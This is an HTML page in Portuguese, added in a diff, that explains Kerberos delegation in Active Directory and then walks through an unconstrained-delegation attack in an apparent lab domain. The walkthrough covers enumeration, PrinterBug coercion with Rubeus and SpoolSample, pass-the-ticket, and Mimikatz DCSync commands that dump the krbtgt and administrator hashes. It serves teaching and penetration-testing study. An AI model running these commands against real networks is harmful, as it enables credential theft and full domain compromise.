@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Understandig delegation</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: 'Courier New', monospace;
+            margin: 60px auto;
+            width: 75%;
+            font-size: 14px;
+        }
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        b {
+            color: #f54f4f;
+        }
+
+        #asci{
+            font-size: 9px;
+            line-height: 1; /* Mantém o espaçamento vertical correto */
+            margin: 0;
+        }
+    
+    </style>
+</head>
+<body>
+    <div id="asci">
+            <center><pre>
+        <p>
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀        ⢀⠤⠒⠒⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢟⣇⠤⠒⠂⠤⡀⠀⢰⠃⠀⠀⣀⠄⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠈⢆⢺⠀⠀⠀⠣⣀⣀⡼⢤⣶⣶⣶⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣸⡀⠀⢀⣴⣤⠀⡜⠘⢆⣠⠴⠋⣩⣴⡾⢟⣿⣿⣿⣿⣶⣾⣭⣝⡶⣄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣤⠀⢸⣿⠃⠀⠀⣠⡼⠣⣤⣿⣿⣛⠤⠛⣿⣿⡿⣻⣿⣟⡿⠿⣿⣘⣿⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣠⣴⣶⣶⣿⣿⣯⣶⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⢀⠀⠀⠀⠈⢺⣻⣄⠀⠻⣄⣀⣴⣋⢔⢪⡶⠛⠀⢑⣲⢶⣿⣿⠾⠛⢡⠁⠀⠰⢿⣿⣿⡽⡆⠀⠀⠀
+⠀⠀⣠⣾⡿⠛⣿⡿⣿⣿⡯⠭⣍⣛⠷⣿⣧⢀⣶⡿⠲⡀⢀⣤⣪⠭⠭⣉⠑⠢⡀⠀⠉⠚⠭⣶⢶⡞⠁⢁⣴⢻⠀⠀⢰⠁⠀⠉⢆⠀⠀⣀⠤⣁⠀⢰⣁⡈⠙⢿⢻⠀⠀⠀
+⠠⠊⠉⠉⠁⠈⢉⢼⣿⠏⣴⡄⠀⠈⠙⠯⣿⣷⠁⢀⣷⢡⡾⠋⠐⢀⡀⠈⢳⠀⢱⠀⠀⢠⣾⡟⡏⣇⣴⢟⣡⠼⡀⠀⠀⠁⠀⠀⡸⡰⠉⢀⣆⡤⢷⠼⡟⠋⠀⠸⡼⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⡇⢸⠉⠉⠉⠐⣦⣄⠀⠀⠈⢿⣧⡸⣿⢸⠃⠀⠀⠘⠯⠤⠋⣴⡽⠀⠀⠎⠁⣸⣼⢟⠁⠈⠀⠀⡹⠢⢄⣀⡠⠔⠁⡇⠀⠀⡟⠻⡷⣦⠇⠀⠀⢠⢧⠠⣾⣦
+⠀⠀⠀⠀⣀⠸⡂⠀⠉⠈⠀⠀⠈⠫⡄⠀⠀⠀⠘⢳⣽⣾⡆⠀⠀⠀⠀⠀⠱⠋⠀⠀⣠⣴⣾⣟⠁⣨⣖⠤⠤⣲⠥⣤⠤⣀⠀⠀⠀⠳⣄⠀⠑⢄⡀⠀⠀⢀⡴⢳⣣⠑⠛⠉
+⠀⠀⠀⠈⠿⠛⠣⡀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠈⠿⣟⣦⡀⠑⠦⣴⣶⡾⣶⣿⠟⡏⣾⣿⣦⡤⠜⠀⣼⠁⢀⡿⠀⠀⠱⡄⠀⠀⠈⠓⠲⠤⠬⠟⠛⠉⠀⢺⡟⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⠢⠤⠤⠤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠶⠞⠒⠛⠉⠀⣾⣷⠋⣿⣿⠟⣁⡠⠎⠢⠤⠝⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠀⢻⡝⡟⣶⣦⣶⣦⣤⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡈⠢⣁⠀⠀⠈⠑⢄⡠⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⡠⠊⠉⠁⠂⢼⣵⠀⠀⠉⠁⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⡀⠀⠀⠀⠇⠀⠀⠀⠀⢾⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠈⠢⢄⣀⡴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+        </p></center>
+    </pre>
+
+    </div>
+    <h1>Understandig delegation</h1>
+    <p>Delegation no contexto do Active Directory refere-se a um mecanismo que permite que uma entidade (usuário, computador ou serviço) atue em nome de outra entidade para acessar recursos na rede.
+    De forma simples, é quando você permite que um serviço ou aplicação “se passe por” um usuário para acessar outros serviços na rede.
+    Olhando para o protocolo Kerberos, que é o mecanismo de autenticação padrão do Active Directory, delegation permite que um serviço receba um 
+    ticket autenticação de outro usuário e use esse ticket para acessar outros recursos em nome daquele usuário.</p>
+
+    <h2>Cenário</h2>
+    <p>Imagine que uma aplicação web acesse um banco de dado SQL Server back-end:</p>
+    <ol>
+        <li>O usuário se autentica na aplicação web</li>
+        <li>A aplicação web precisa acessar o SQL Server em nome do usuário</li>
+        <li>Com delegation, a aplicação web pode usar as credencias do usuário para autenticar no SQL Server</li>
+        <li>O SQL server vê a requisição como vindo do usuário original e não da aplicação web</li>
+    </ol>
+    <center><img src="k1.png" alt="delegation" width="600px"></center>
+
+    <h3>Observação:</h3>
+    <p>Sem delegation, o SQL Server veria todas as requisições como vindas de conta de serviço da aplicação web, não conseguindo distinguir entre diferente usuário finais.</p>
+    <br>
+    <h2>Por que ela é usada</h2>
+    <p>Delegation existe para resolver problemas arquiteturais e de segurança em ambientes corporativos com múltiplas camadas de serviços, 
+    sem ela, o Active Directory vira terra de <i>Domain Admin pra tudo</i>, o que é operacionalmente burro e ofensivamente bom (pra quem ataca).<br>
+    Delegation em Active Directory permite distribuir tarefas administrativas do dia a dia sem precisar conceder privilégios amplos como os de Domain Admin, ela se baseia em ACLs, que definem de forma precisa o que cada usuário ou grupo pode fazer sobre objetos específicos do AD, com isso, o ambiente se torna mais organizado, escalável e alinhado ao princípio do menor privilégio. Também facilita auditorias e deixa mais clara a responsabilidade de cada equipe.<br>
+    Por outro lado, quando mal configurada, a delegation pode criar administradores “invisíveis” e abrir caminhos discretos para escalada de privilégios.
+    Delegation é uma necessidade operacional que, quando mal implementada, se transforma em um dos vetores de escalada de privilégio mais silenciosos do ambiente, e vamos mostrar isso mais a baixo.</p>
+    <br>
+    
+    <h2>Tipos de Delegation:</h2>
+        <h3>1 - Unconstrained Delegation (Delegação Irrestrita)</h3>
+        <p>É o tipo mais antigo e perigoso de delagation, quando habilitado, o serviço pode impersonar o usuário em qualquer serviço de domínio. Não há restrições sobre quais recursos podem ser acessados.</p>
+        <h4>Atributo AD</h4>
+        <p><b>TrustedForDelegation = True</b> no objeto do computador/usuário</p>
+        <p>Definido no atributo userAccountControl com a flag <b>TRUSTED_FOR_DELEGATION</b></p>
+        <br>
+    
+        <h3>2 - Constrained Delegation (Delegação Restrita)</h3>
+        <p>Foi introduzido no Winddows Server em 2003, permite delegation apenas para serviços específicos (SPNs definidos), Administradores definem explicitamente quais serviços podem ser acessados.</p>
+        <h4>Atributo AD</h4>
+        <p><b>msDS-AllowedToDelegateTo</b> - contém lista de SPNs permitidos</p>
+        <br>
+
+        <h3>3 - Resource-Based Constrained Delegation (RBCD)</h3>
+        <p>Introduzido no Windows Server 2012, a configuração é feita no recurso de destino, não na origem. Permite que administradores de recursos controlem quem pode delegar para seu serviços.</p>
+        <h4>Atributo AD</h4>
+        <p><b>msDS-AllowedToActOnBehalfOfOtherIdentity</b> - no objeto de destino (ex: SQL Server)</p>
+        <br>
+
+    <h1>Como funciona Unconstrained Delegation</h1>
+    <p>Quando Unconstrained Delegation está habilitado em um servidor (por exemplo, WEBSERVER01), o processo funciona assim:</p>
+    <h3>Passo 1: Usuário Autentica no Serviço</h3>
+    <ol>
+        <li>O usuário (ex: alice) solicita acesso ao serviço em WEBSERVER01</li>
+        <li>O cliente do usuário contacta o KDC (Key Distribution Center - geralmente um Domain Controller)</li>
+        <li>O KDC verifica que WEBSERVER01 tem Unconstrained Delegation habilitada</li>
+        <li>O KDC emite um TGS (Ticket Granting Service) para o serviço em WEBSERVER01</li>
+        <br>
+        <br>
+    </ol>
+
+    <h3>Passo 2: TGT é Armazenado no Servidor</h3>
+    <h4><b>PARTE CRITICA DA SEGURANÇA:</b></h4>
+    <p>Quando o usuário se autentica em um serviço com Unconstrained Delegation, uma cópia do TGT (Ticket Granting Ticket) do usuário é incluída no TGS e enviada para o servidor.
+        <br>O servidor WEBSERVER01 agora possui: </p>
+        <li>O TGS para autenticar o usuário no serviço local</li>
+        <li>Uma cópia do TGT do usuário armazenada em memória (LSASS)</li>
+        <br>
+        <br>
+
+    <h3>Passo 3: Servidor Usa TGT para Impersonar Usuário</h3>
+    <p>Quando WEBSERVER01 precisa acessar outro recurso (ex: SQLSERVER01) em nome de alice:</p>
+    <ol>
+        <li>WEBSERVER01 usa o TGT de alice (que está em sua memória)</li>
+        <li>Solicita um TGS para SQLSERVER01 ao KDC usando o TGT de alice</li>
+        <li>O KDC emite o TGS como se fosse alice fazendo a requisição</li>
+        <li>WEBSERVER01 usa esse TGS para autenticar em SQLSERVER01 como alice</li>
+    </ol>
+    <br>
+    <center><h4>O fluxo a seguir mostra como acontece essa autenticação</h4>
+    <img src="k2.png" alt="unconstrained" width="600px"></center>
+
+    <h2>Por Que Isso é Extremamente Perigoso</h2>
+    <h3>Problema 1: TGT em Memória</h3>
+    <p>Se um atacante compromete um servidor com Unconstrained Delegation, ele pode:</p>
+    <li>Extrair todos os TGTs armazenados em memória</li>
+    <li>Impersonar qualquer usuário que tenha se autenticado naquele servidor</li>
+    <li>Incluindo Domain Admins e Enterprise Admins</li>
+    <br>
+    <h3>Problema 2: Sem restrições e Domain Controles</h3>
+    <p>O servidor pode usar esses TGTs para acessar qualquer serviço no domínio, sem limitações. <br>
+    <strong>Domain Controllers sempre têm Unconstrained Delegation habilitada por padrão</strong>. Se você comprometer um DC, você tem acesso a todos os TGTs que passarem por ele.</p>
+    <br>
+    <h1>Explorando Unconstrained Delegation</h1>
+        <br>
+    <h2>Enumeração</h2>
+        <p>Precisamos buscar objetos de computadores com a propriedade <b>TrustedForDelegation</b> definida como <b>true</b>:</p>
+        <br>
+    <h3>Powershell</h3>
+    <p># Encontrar computadores </p>
+    <p>Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,servicePrincipalName,Description</p>
+    <p># Encontrar usuários</p>
+    <p>Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,servicePrincipalName,Description</p>
+    <br>
+    <h3>ADSearch</h3>
+    <p>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname</p>
+    <br>
+    <h3>BloodHound</h3>
+    <p>Podemos usar essa cypher para encontrar caminhos de Unconstrained Delegation <br>
+        <br>MATCH (c {unconstraineddelegation:true}) RETURN c</p>
+        <br>
+
+        <center><h4>Exemplo</h4>
+        <img src="k3.png" alt="pwnede"></center>
+            <br>
+        <h3>Vamos assumir que ja temos uma dessas maquina comprometidas, normalmente seria por (Pass-the-hash)</h3>
+    <br>
+    <h2>Forçar autenticação</h2>
+    <p>usuários privilegiados (Domain Admins) raramente se autenticam em servidores web comuns. Você precisa forçar um Domain Controller ou admin a se autenticar no servidor comprometido.</p>
+    <p>Podemos usar uma técnica chamada de <strong>PrinterBug (MS-RPRN Abuse)</strong></p>
+    <br>
+    <h3>PrinterBug (MS-RPRN Abuse)</h3>
+    <p>Como funciona:</p>
+    <li>Abusa da função <b>RpcRemoteFindFirstPrinterChangeNotification</b> do Print Spooler</li>
+    <li>Força um servidor remoto (ex: DC) a se autenticar de volta para você</li>
+    <br>
+    <p>Usando o mode de monitor do Rubeus, precisamos ficar “escutando” em um terminal</p>
+    <br>
+    <p>.\Rubeus.exe monitor /interval:10 /nowrap</p>
+    <img src="k4.png" alt="rubeus">
+    <br>
+    <p>Em outro terminal iremos precisar da ferramenta chamada de SpoolSample</p>
+    <br>
+    <p>.\SpoolSample.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io</p>
+    <br>
+    <li>dc-2.dev.cyberbotic.io - Nosso alvo</li>
+    <li>web.dev.cyberbotic.io -  Nosso ouvinte</li>
+    <br>
+    <p>Então no Rubeus conseguimos capturar o ticket</p>
+    <pre>
+        <p>[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:
+
+  User                  :  DC-2$@DEV.CYBERBOTIC.IO
+  StartTime             :  9/6/2022 9:06:14 AM
+  EndTime               :  9/6/2022 7:06:14 PM
+  RenewTill             :  9/13/2022 9:06:14 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+doIFujaJQdlDLklP...</p>
+    </pre>
+
+    <p>com o ticket em mãos podemos usar uma técnica chamada <strong>(Pass-the-ticket)</strong> para se passar por aquele usuário. <br>Podemos usar o Rubeus para isso:</p>
+    <br>
+    <h2>Pass-the-ticket</h2>
+    <p># Importar TGT capturado para sessão atual <br>
+        <br>
+    Rubeus.exe ptt /ticket:base64ticket <br>
+        <br>
+    # Verificar tickets importados <br>
+    <br>
+    klist
+    <br>
+    <br>
+    # Agora você pode usar comandos como se fosse o usuário <br>
+    <br>
+    dir \\dc-2.dev.cyberbotic.io\C$ <br>
+    <br>
+
+    Enter-PSSession -ComputerName dc-2.dev.cyberbotic.io</p>
+    
+        <br>
+    <p>Depois capturar o TGT de uma conta privilegiada ( DA ou DC machine account) você pode realizar o ataque de DCSync:</p>
+    <p>Usando o Mimikatz:</p>
+    <br>
+    <h2>Mimikatz</h2>
+    <p># Dumpar hash do krbtgt (permite criar Golden Tickets) <br>
+        <br>
+    lsadump::dcsync /domain:domain.local /user:krbtgt <br>
+        <br>
+    # Dumpar hash de qualquer usuário <br>
+    <br>
+    lsadump::dcsync /domain:domain.local /user:administrator</p>
+</body>
+</html>
